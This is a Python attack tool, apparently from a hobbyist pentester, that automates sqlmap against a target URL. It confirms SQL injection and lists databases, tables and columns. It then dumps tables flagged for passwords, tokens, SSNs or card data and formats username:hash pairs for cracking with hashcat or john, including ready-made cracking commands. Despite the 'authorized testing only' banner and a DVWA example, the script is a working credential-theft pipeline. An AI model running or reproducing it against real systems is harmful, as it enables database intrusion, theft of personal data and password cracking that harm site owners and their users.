#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║    ███████╗ ██████╗ ██╗         ██╗  ██╗ █████╗ ███████╗██╗  ██╗           ║
║    ██╔════╝██╔═══██╗██║         ██║  ██║██╔══██╗██╔════╝██║  ██║           ║
║    ███████╗██║   ██║██║         ███████║███████║███████╗███████║           ║
║    ╚════██║██║▄▄ ██║██║         ██╔══██║██╔══██║╚════██║██╔══██║           ║
║    ███████║╚██████╔╝███████╗    ██║  ██║██║  ██║███████║██║  ██║           ║
║    ╚══════╝ ╚══▀▀═╝ ╚══════╝    ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝           ║
║                                                                              ║
║              ██╗  ██╗ █████╗ ███████╗██╗  ██╗                               ║
║              ██║  ██║██╔══██╗██╔════╝██║  ██║                               ║
║              ███████║███████║███████╗███████║                               ║
║              ██╔══██║██╔══██║╚════██║██╔══██║                               ║
║              ██║  ██║██║  ██║███████║██║  ██║                               ║
║              ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝                               ║
║                                                                              ║
║  ┌──────────────────────────────────────────────────────────────────────┐   ║
║  │   Author     :  MrDestroyer                                          │   ║
║  │   Instagram  :  @zimthegoat                                          │   ║
║  │   TryHackMe  :  tryhackme.com/p/MohammadZim                         │   ║
║  │   Tool       :  SQL Hash Password Extractor v4.0 (sqlmap engine)    │   ║
║  │   Purpose    :  Authorized Penetration Testing Only                 │   ║
║  └──────────────────────────────────────────────────────────────────────┘   ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import subprocess
import requests
import argparse
import sys
import os
import re
import csv
import time
from pathlib import Path

# ── ANSI Colors ──────────────────────────────────────────────────────────────
class C:
    R="\033[91m"; G="\033[92m"; Y="\033[93m"; B="\033[94m"
    M="\033[95m"; CY="\033[96m"; W="\033[97m"
    BOLD="\033[1m"; DIM="\033[2m"; RESET="\033[0m"

def banner():
    print(f"""{C.CY}{C.BOLD}
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║    ███████╗ ██████╗ ██╗         ██╗  ██╗ █████╗ ███████╗██╗  ██╗           ║
║    ██╔════╝██╔═══██╗██║         ██║  ██║██╔══██╗██╔════╝██║  ██║           ║
║    ███████╗██║   ██║██║         ███████║███████║███████╗███████║           ║
║    ╚════██║██║▄▄ ██║██║         ██╔══██║██╔══██║╚════██║██╔══██║           ║
║    ███████║╚██████╔╝███████╗    ██║  ██║██║  ██║███████║██║  ██║           ║
║    ╚══════╝ ╚══▀▀═╝ ╚══════╝    ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝           ║
║                                                                              ║
║              ██╗  ██╗ █████╗ ███████╗██╗  ██╗                               ║
║              ██║  ██║██╔══██╗██╔════╝██║  ██║                               ║
║              ███████║███████║███████╗███████║                               ║
║              ██╔══██║██╔══██║╚════██║██╔══██║                               ║
║              ██║  ██║██║  ██║███████║██║  ██║                               ║
║              ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝                               ║
║                                                                              ║{C.RESET}
{C.Y}{C.BOLD}║  ┌──────────────────────────────────────────────────────────────────────┐  ║
║  │                                                                      │  ║
║  │   Author     :  MrDestroyer                                          │  ║
║  │   Instagram  :  @zimthegoat                                          │  ║
║  │   TryHackMe  :  tryhackme.com/p/MohammadZim                         │  ║
║  │   Tool       :  SQL Hash Password Extractor v4.0 (sqlmap engine)    │  ║
║  │   Purpose    :  Authorized Penetration Testing Only                 │  ║
║  │                                                                      │  ║
║  └──────────────────────────────────────────────────────────────────────┘  ║{C.RESET}
{C.CY}{C.BOLD}╚══════════════════════════════════════════════════════════════════════════════╝{C.RESET}
""")

def info(m):  print(f"  {C.B}[*]{C.RESET} {m}")
def good(m):  print(f"  {C.G}[+]{C.RESET} {m}")
def warn(m):  print(f"  {C.Y}[!]{C.RESET} {m}")
def err(m):   print(f"  {C.R}[-]{C.RESET} {m}")
def found(m): print(f"  {C.M}[★]{C.RESET} {C.BOLD}{m}{C.RESET}")
def step(m):  print(f"\n{C.CY}{'─'*62}{C.RESET}\n  {C.CY}{C.BOLD}[→] {m}{C.RESET}\n")

# ── Keywords that suggest juicy data worth dumping ────────────────────────────
JUICY_TABLE_KW  = ["user","account","member","admin","login","cred",
                   "staff","employee","customer","person","auth","pass",
                   "secret","token","key","flag","note","data","info"]

JUICY_COL_KW    = ["pass","hash","pwd","secret","crypt","token",
                   "user","name","login","email","flag","ssn",
                   "credit","card","phone","address","priv","role","admin"]

# ── Locate sqlmap ─────────────────────────────────────────────────────────────
def find_sqlmap():
    candidates = [
        "sqlmap",
        "/usr/bin/sqlmap",
        "/usr/local/bin/sqlmap",
        "/usr/share/sqlmap/sqlmap.py",
        "/opt/sqlmap/sqlmap.py",
        os.path.expanduser("~/sqlmap/sqlmap.py"),
        os.path.expanduser("~/tools/sqlmap/sqlmap.py"),
    ]
    for c in candidates:
        p = Path(c)
        if p.exists():
            return ["python3", str(p)] if str(c).endswith(".py") else [str(c)]
    try:
        r = subprocess.run(["which","sqlmap"], capture_output=True, text=True)
        if r.returncode == 0 and r.stdout.strip():
            return [r.stdout.strip()]
    except Exception:
        pass
    return None

# ── Run sqlmap, stream output, return stdout ──────────────────────────────────
def run_sqlmap(cmd):
    full = []
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                                stderr=subprocess.STDOUT, text=True, bufsize=1)
        for line in proc.stdout:
            ls = line.rstrip()
            full.append(ls)
            low = ls.lower()
            # color-code sqlmap's output nicely
            if any(x in low for x in ["[critical]","[error]"]):
                print(f"    {C.R}{ls}{C.RESET}")
            elif "[warning]" in low:
                print(f"    {C.Y}{ls}{C.RESET}")
            elif any(x in low for x in ["found","injectable","identified","retrieved",
                                         "dumped","cracked","password","hash"]):
                print(f"    {C.G}{C.BOLD}{ls}{C.RESET}")
            elif "[info]" in low or ls.startswith("["):
                print(f"    {C.DIM}{ls}{C.RESET}")
            else:
                print(f"    {ls}")
        proc.wait()
        return "\n".join(full), proc.returncode
    except FileNotFoundError:
        err("sqlmap binary not found.")
        err("Fix: sudo apt install sqlmap")
        sys.exit(1)
    except KeyboardInterrupt:
        print(f"\n  {C.Y}Interrupted{C.RESET}")
        proc.terminate()
        sys.exit(0)

# ── Parse table names from sqlmap stdout ─────────────────────────────────────
def parse_tables(output):
    """Extract table names from sqlmap --tables output (the box-drawn table)."""
    tables = []
    in_box = False
    for line in output.splitlines():
        # sqlmap draws tables like:  +----------+  /  | tablename |
        if re.match(r"\s*\+[-+]+\+\s*$", line):
            in_box = not in_box
            continue
        if in_box and "|" in line:
            # strip leading/trailing pipes and whitespace
            cell = line.strip().strip("|").strip()
            # skip header rows like "Tables" or separator rows
            if cell and not re.match(r"^[-\s]+$", cell) and cell.lower() != "tables":
                tables.append(cell)
    return list(dict.fromkeys(tables))  # deduplicate, preserve order

# ── Parse column names from sqlmap --columns output ──────────────────────────
def parse_columns(output):
    """
    Returns dict: { table_name: [(col_name, col_type), ...] }
    sqlmap prints columns like:
    | Column   | Type         |
    """
    result = {}
    current_table = None

    for line in output.splitlines():
        # detect table header: "Table: accounts"
        m = re.search(r"Table:\s*([a-zA-Z0-9_]+)", line, re.IGNORECASE)
        if m:
            current_table = m.group(1)
            result[current_table] = []
            continue

        if current_table and "|" in line:
            cells = [c.strip() for c in line.strip().strip("|").split("|")]
            if len(cells) >= 2:
                col_name = cells[0]
                col_type = cells[1] if len(cells) > 1 else ""
                # skip header/separator rows
                if (col_name and
                    not re.match(r"^[-\s]+$", col_name) and
                    col_name.lower() not in ("column","columns","type","")):
                    result[current_table].append((col_name, col_type))

    return result

# ── Read all CSV dump files sqlmap wrote ─────────────────────────────────────
def read_csv_dumps(dump_base, db_name, target_url):
    """
    sqlmap writes CSVs to:
      ~/.local/share/sqlmap/output/<host>/dump/<db>/<table>.csv
    We scope to the CURRENT target's host folder so we never
    accidentally pull in results from a previous scan on a different lab.
    """
    from urllib.parse import urlparse
    parsed   = urlparse(target_url)
    hostname = parsed.hostname or ""
    port     = parsed.port
    # sqlmap names the folder  hostname:port  or just  hostname
    host_key = f"{hostname}:{port}" if port else hostname

    results      = []
    search_root  = Path(dump_base)

    # Find the host folder sqlmap created for this target
    host_dirs = []
    if search_root.exists():
        for d in search_root.iterdir():
            if d.is_dir() and (host_key in d.name or hostname in d.name):
                host_dirs.append(d)

    if not host_dirs:
        # Fallback: scan everything but warn
        warn(f"Could not find host folder for {host_key} — scanning all output dirs")
        host_dirs = [search_root]

    for host_dir in host_dirs:
        for csv_path in host_dir.rglob("*.csv"):
            try:
                with open(csv_path, newline="", encoding="utf-8", errors="replace") as f:
                    reader = csv.DictReader(f)
                    rows   = list(reader)
                if rows:
                    results.append({
                        "file":    str(csv_path),
                        "table":   csv_path.stem,
                        "headers": list(rows[0].keys()),
                        "rows":    rows,
                    })
            except Exception as e:
                warn(f"Could not read {csv_path}: {e}")

    return results

# ── Check if a table/column set looks juicy ───────────────────────────────────
def is_juicy_table(name):
    n = name.lower()
    return any(k in n for k in JUICY_TABLE_KW)

def juicy_columns(headers):
    """Return the headers that look interesting."""
    return [h for h in headers if any(k in h.lower() for k in JUICY_COL_KW)]

# ── Print a dump table nicely ─────────────────────────────────────────────────
def print_table_dump(table_name, headers, rows):
    if not rows:
        return
    # figure out column widths
    widths = {h: max(len(h), max(len(str(r.get(h,""))) for r in rows)) for h in headers}
    widths = {h: min(v, 40) for h, v in widths.items()}  # cap at 40 chars

    header_line = "  " + "  ".join(f"{h:<{widths[h]}}" for h in headers)
    sep_line    = "  " + "  ".join("─" * widths[h] for h in headers)

    print(f"\n  {C.CY}{C.BOLD}[TABLE: {table_name}]{C.RESET}")
    print(f"  {C.BOLD}{header_line}{C.RESET}")
    print(sep_line)
    for row in rows:
        cells = []
        for h in headers:
            val = str(row.get(h, ""))[:widths[h]]
            # colour password/hash columns red
            if any(k in h.lower() for k in ["pass","hash","pwd","secret","crypt"]):
                cells.append(f"{C.R}{val:<{widths[h]}}{C.RESET}")
            elif any(k in h.lower() for k in ["user","name","login","email"]):
                cells.append(f"{C.G}{val:<{widths[h]}}{C.RESET}")
            else:
                cells.append(f"{val:<{widths[h]}}")
        print("  " + "  ".join(cells))
    print()

# ── Save final report ─────────────────────────────────────────────────────────
def save_report(all_dumps, target, outfile):
    with open(outfile, "w") as f:
        f.write("=" * 70 + "\n")
        f.write("  SQL HASH EXTRACTOR v4.0 — by MrDestroyer\n")
        f.write("  Instagram : @zimthegoat\n")
        f.write("  TryHackMe : tryhackme.com/p/MohammadZim\n")
        f.write("=" * 70 + "\n")
        f.write(f"  Target : {target}\n")
        f.write("=" * 70 + "\n\n")

        hashcat_lines = []

        for dump in all_dumps:
            tbl     = dump["table"]
            headers = dump["headers"]
            rows    = dump["rows"]

            f.write(f"\n[TABLE: {tbl}]\n")
            f.write("  " + " | ".join(f"{h:<20}" for h in headers) + "\n")
            f.write("  " + "-" * (23 * len(headers)) + "\n")
            for row in rows:
                f.write("  " + " | ".join(f"{str(row.get(h,'')):<20}" for h in headers) + "\n")

            # hashcat format: find user + pass columns
            u_col = next((h for h in headers if any(k in h.lower() for k in
                          ["user","name","login","email","account"])), None)
            p_col = next((h for h in headers if any(k in h.lower() for k in
                          ["pass","hash","pwd","secret","crypt"])), None)
            if u_col and p_col:
                f.write(f"\n  [HASHCAT FORMAT for {tbl}]\n")
                for row in rows:
                    u = row.get(u_col, "")
                    h = row.get(p_col, "")
                    if u and h:
                        line = f"{u}:{h}"
                        f.write(f"  {line}\n")
                        hashcat_lines.append(line)

        if hashcat_lines:
            f.write("\n\n" + "=" * 70 + "\n")
            f.write("  [ALL HASHES — hashcat ready]\n")
            f.write("=" * 70 + "\n")
            for line in hashcat_lines:
                f.write(line + "\n")

    good(f"Full report saved → {C.CY}{outfile}{C.RESET}")


# ── Auto-detect if URL has an HTML form ──────────────────────────────────────
def detect_form(url, cookie="", timeout=10):
    """
    Fetch the page and check for <form> tags.
    Returns (has_form, form_method, form_action, form_fields)
    """
    try:
        headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"}
        cookies = {}
        if cookie:
            for part in cookie.split(";"):
                part = part.strip()
                if "=" in part:
                    k, v = part.split("=", 1)
                    cookies[k.strip()] = v.strip()

        resp = requests.get(url, headers=headers, cookies=cookies,
                            timeout=timeout, verify=False)
        html = resp.text.lower()

        if "<form" not in html:
            return False, None, None, []

        # parse method
        method_m = re.search(r"<form[^>]+method=[\"']?([a-z]+)[\"']?", html)
        form_method = method_m.group(1).upper() if method_m else "GET"

        # parse action
        action_m = re.search(r"<form[^>]+action=[\"']([^\"'>]+)", html)
        form_action = action_m.group(1) if action_m else url

        # parse input field names
        fields = re.findall(r"<input[^>]+name=[\"']([^\"'>]+)[\"']?", html)
        fields += re.findall(r"<select[^>]+name=[\"']([^\"'>]+)[\"']?", html)
        fields += re.findall(r"<textarea[^>]+name=[\"']([^\"'>]+)[\"']?", html)

        return True, form_method, form_action, fields

    except Exception:
        return False, None, None, []

# ── Build base sqlmap command ─────────────────────────────────────────────────
def base_cmd(sqlmap_bin, args, dump_dir):
    cmd = [
        *sqlmap_bin,
        "-u", args.url,
        "--batch",
        "--flush-session",   # never use cached results from old scans
        "--level",   str(args.level),
        "--risk",    str(args.risk),
        "--threads", str(args.threads),
        "--output-dir", dump_dir,
    ]
    if args.param:   cmd += ["-p", args.param]
    if args.data:    cmd += ["--data", args.data]
    if args.cookie:  cmd += ["--cookie", args.cookie]
    if args.dbms:    cmd += ["--dbms", args.dbms]
    if args.delay:   cmd += ["--delay", str(args.delay)]
    if args.proxy:   cmd += ["--proxy", args.proxy]
    if args.tamper:  cmd += ["--tamper", args.tamper]
    if args.method.upper() == "POST":
        cmd += ["--method", "POST"]
    # --forms: added automatically if a form was detected on the page
    if getattr(args, "_use_forms", False):
        cmd += ["--forms"]
    return cmd


# ═════════════════════════════════════════════════════════════════════════════
# MAIN PIPELINE
# ═════════════════════════════════════════════════════════════════════════════
def run_pipeline(args, sqlmap_bin):
    dump_dir = os.path.expanduser("~/.local/share/sqlmap/output")

    # ── AUTO-DETECT FORM ─────────────────────────────────────────────────────
    step("Pre-flight — Detecting page type (form vs plain parameter)")
    has_form, form_method, form_action, form_fields = detect_form(args.url, args.cookie)

    if has_form:
        good(f"HTML form detected!")
        info(f"  Method : {C.CY}{form_method}{C.RESET}")
        info(f"  Fields : {C.CY}{form_fields}{C.RESET}")
        info(f"  Adding --forms flag to sqlmap automatically")
        args._use_forms = True
        # if user didn't specify method, adopt the form's method
        if args.method.upper() == "GET" and form_method == "POST":
            args.method = "POST"
            info(f"  Method upgraded to POST (from form tag)")
    else:
        good(f"No form detected — treating as plain GET/POST parameter")
        args._use_forms = False

    base     = base_cmd(sqlmap_bin, args, dump_dir)

    # ── STEP 1: Confirm injectable + list all databases ───────────────────────
    step("Step 1 — Confirming injection & listing all databases")
    out_dbs, rc = run_sqlmap(base + ["--dbs"])

    if rc != 0 or "not injectable" in out_dbs.lower():
        err("Target does not appear injectable with current settings.")
        warn("Try: --level 3 --risk 2  or  --tamper space2comment")
        sys.exit(1)

    # parse databases
    dbs = re.findall(r"\[\*\]\s+(\S+)", out_dbs)
    if not dbs:
        # fallback: look for lines like  [INFO] retrieved: dbname
        dbs = re.findall(r"retrieved[:\s]+([a-zA-Z0-9_]+)", out_dbs, re.IGNORECASE)
    dbs = [d for d in dbs if d.lower() not in ("starting","usage","legal","disclaimer")]

    # get current db
    cur_db_m = re.search(r"current database[^:]*:\s*['\"]?([a-zA-Z0-9_]+)", out_dbs, re.IGNORECASE)
    current_db = cur_db_m.group(1) if cur_db_m else (dbs[0] if dbs else None)

    print(f"\n  {C.BOLD}All Databases:{C.RESET}")
    for d in dbs:
        marker = f"  {C.Y}← current{C.RESET}" if d == current_db else ""
        print(f"    {C.CY}• {d}{C.RESET}{marker}")

    if not current_db:
        err("Could not determine current database")
        sys.exit(1)

    good(f"Working with database: {C.G}{current_db}{C.RESET}")

    # ── STEP 2: List all tables ───────────────────────────────────────────────
    step(f"Step 2 — Listing all tables in '{current_db}'")
    out_tables, _ = run_sqlmap(base + ["--tables", "-D", current_db])
    tables = parse_tables(out_tables)

    if not tables:
        # fallback regex
        tables = re.findall(r"\|\s+([a-zA-Z_][a-zA-Z0-9_]*)\s+\|", out_tables)
        tables = [t for t in tables if t.lower() not in ("tables","table","name")]
        tables = list(dict.fromkeys(tables))

    print(f"\n  {C.BOLD}Tables in {current_db}:{C.RESET}")
    for t in tables:
        juicy = f"  {C.M}★ JUICY{C.RESET}" if is_juicy_table(t) else ""
        print(f"    {C.Y}• {t}{C.RESET}{juicy}")

    # ── STEP 3: Enumerate columns for ALL tables ──────────────────────────────
    step(f"Step 3 — Enumerating columns for all tables")
    out_cols, _ = run_sqlmap(base + ["--columns", "-D", current_db])
    col_map = parse_columns(out_cols)

    print(f"\n  {C.BOLD}Column overview:{C.RESET}")
    for tbl in tables:
        cols = col_map.get(tbl, [])
        col_names = [c[0] for c in cols]
        juicy_c   = juicy_columns(col_names)
        juicy_tag = f"  {C.M}[juicy cols: {', '.join(juicy_c)}]{C.RESET}" if juicy_c else ""
        print(f"    {C.Y}{tbl}{C.RESET}  →  {C.DIM}{', '.join(col_names) or '(none retrieved)'}{C.RESET}{juicy_tag}")

    # ── STEP 4: Dump juicy tables ─────────────────────────────────────────────
    # A table is worth dumping if:
    #   - its name looks juicy, OR
    #   - it has columns that look juicy
    dump_targets = []
    for tbl in tables:
        cols      = col_map.get(tbl, [])
        col_names = [c[0] for c in cols]
        if is_juicy_table(tbl) or juicy_columns(col_names):
            dump_targets.append(tbl)

    if not dump_targets:
        warn("No obviously juicy tables found — dumping all tables")
        dump_targets = tables

    step(f"Step 4 — Dumping {len(dump_targets)} juicy table(s): {C.Y}{dump_targets}{C.RESET}")

    for tbl in dump_targets:
        good(f"Dumping table: {C.Y}{tbl}{C.RESET}")
        run_sqlmap(base + ["--dump", "-D", current_db, "-T", tbl])

    # ── STEP 5: Read all CSVs sqlmap wrote ────────────────────────────────────
    step("Step 5 — Collecting all dumped data")
    all_dumps = read_csv_dumps(dump_dir, current_db, args.url)

    return all_dumps, current_db, dbs, tables


# ── CLI args ──────────────────────────────────────────────────────────────────
def parse_args():
    ap = argparse.ArgumentParser(
        formatter_class=argparse.RawTextHelpFormatter,
        description=(
            f"{C.CY}{C.BOLD}SQL Hash Extractor v4.0 — sqlmap engine — by MrDestroyer{C.RESET}\n\n"
            f"{C.Y}Examples:{C.RESET}\n"
            "  # Basic GET\n"
            "  python3 sql_hash_extractor.py -u 'http://site.com/page?id=2'\n\n"
            "  # Specific param\n"
            "  python3 sql_hash_extractor.py -u 'http://site.com/page?id=2' -p id\n\n"
            "  # POST form\n"
            "  python3 sql_hash_extractor.py -u 'http://site.com/login.php' \\\n"
            "      -m POST -d 'username=x&password=y'\n\n"
            "  # With session cookie (DVWA)\n"
            "  python3 sql_hash_extractor.py \\\n"
            "      -u 'http://127.0.0.1/dvwa/sqli/?Submit=Submit' -p id \\\n"
            "      --cookie 'security=low; PHPSESSID=abc123'\n\n"
            "  # Harder target\n"
            "  python3 sql_hash_extractor.py -u 'http://target/page?id=1' \\\n"
            "      --level 3 --risk 2 --tamper space2comment\n"
        )
    )
    ap.add_argument("-u","--url",     required=True,  help="Target URL")
    ap.add_argument("-p","--param",   default="",     help="Parameter to inject (auto if omitted)")
    ap.add_argument("-m","--method",  default="GET",  choices=["GET","POST"])
    ap.add_argument("-d","--data",    default="",     help="POST body: 'user=x&pass=y'")
    ap.add_argument("--cookie",       default="",     help="Cookie header: 'PHPSESSID=x; security=low'")
    ap.add_argument("--dbms",         default="",     help="Force DBMS: mysql, mssql, postgres, sqlite")
    ap.add_argument("--level",        type=int, default=1,  help="sqlmap level 1-5  (default 1)")
    ap.add_argument("--risk",         type=int, default=1,  help="sqlmap risk  1-3  (default 1)")
    ap.add_argument("--threads",      type=int, default=4,  help="Threads (default 4)")
    ap.add_argument("--delay",        type=float, default=0, help="Delay between requests (s)")
    ap.add_argument("--proxy",        default="",     help="Proxy: http://127.0.0.1:8080")
    ap.add_argument("--tamper",       default="",     help="Tamper scripts: space2comment,between")
    ap.add_argument("-o","--output",  default="hash_dump.txt", help="Output file")
    return ap.parse_args()


def main():
    banner()
    args = parse_args()

    print(f"  {C.DIM}{'─'*62}{C.RESET}")
    print(f"  {C.Y}⚠  Authorized penetration testing only.{C.RESET}")
    print(f"  {C.DIM}{'─'*62}{C.RESET}\n")

    sqlmap_bin = find_sqlmap()
    if not sqlmap_bin:
        err("sqlmap not found! Install: sudo apt install sqlmap")
        sys.exit(1)
    good(f"sqlmap: {C.G}{' '.join(sqlmap_bin)}{C.RESET}")
    info(f"Target : {C.CY}{args.url}{C.RESET}")
    if args.param:  info(f"Param  : {C.CY}{args.param}{C.RESET}")
    if args.cookie: info(f"Cookie : {C.DIM}{args.cookie[:50]}{C.RESET}")

    all_dumps, current_db, dbs, tables = run_pipeline(args, sqlmap_bin)

    # ── Print all dumped data ─────────────────────────────────────────────────
    print(f"\n{C.CY}{'═'*62}{C.RESET}")
    print(f"  {C.BOLD}{C.CY}DUMP RESULTS{C.RESET}")
    print(f"{C.CY}{'═'*62}{C.RESET}")

    if not all_dumps:
        warn("No CSV data found in sqlmap output directory.")
        info(f"Check manually: {C.CY}~/.local/share/sqlmap/output/{C.RESET}")
    else:
        for dump in all_dumps:
            print_table_dump(dump["table"], dump["headers"], dump["rows"])

    # ── Hashcat summary ───────────────────────────────────────────────────────
    hashcat_lines = []
    for dump in all_dumps:
        headers = dump["headers"]
        u_col = next((h for h in headers if any(k in h.lower() for k in
                      ["user","name","login","email","account"])), None)
        p_col = next((h for h in headers if any(k in h.lower() for k in
                      ["pass","hash","pwd","secret","crypt"])), None)
        if u_col and p_col:
            for row in dump["rows"]:
                u = row.get(u_col,"").strip()
                h = row.get(p_col,"").strip()
                if u and h:
                    hashcat_lines.append(f"{u}:{h}")

    if hashcat_lines:
        print(f"\n  {C.BOLD}{C.Y}[HASHCAT FORMAT]{C.RESET}")
        print(f"  {C.DIM}{'─'*40}{C.RESET}")
        for line in hashcat_lines:
            print(f"  {C.R}{line}{C.RESET}")
        print(f"\n  {C.Y}→ Crack with:{C.RESET}")
        print(f"  {C.DIM}  hashcat -m 0    {args.output} /usr/share/wordlists/rockyou.txt  (MD5){C.RESET}")
        print(f"  {C.DIM}  hashcat -m 1800 {args.output} /usr/share/wordlists/rockyou.txt  (sha512crypt){C.RESET}")
        print(f"  {C.DIM}  hashcat -m 3200 {args.output} /usr/share/wordlists/rockyou.txt  (bcrypt){C.RESET}")
        print(f"  {C.DIM}  john --wordlist=/usr/share/wordlists/rockyou.txt {args.output}{C.RESET}")

    if all_dumps:
        save_report(all_dumps, args.url, args.output)

    print(f"\n{C.CY}{'═'*62}{C.RESET}\n")


if __name__ == "__main__":
    main()
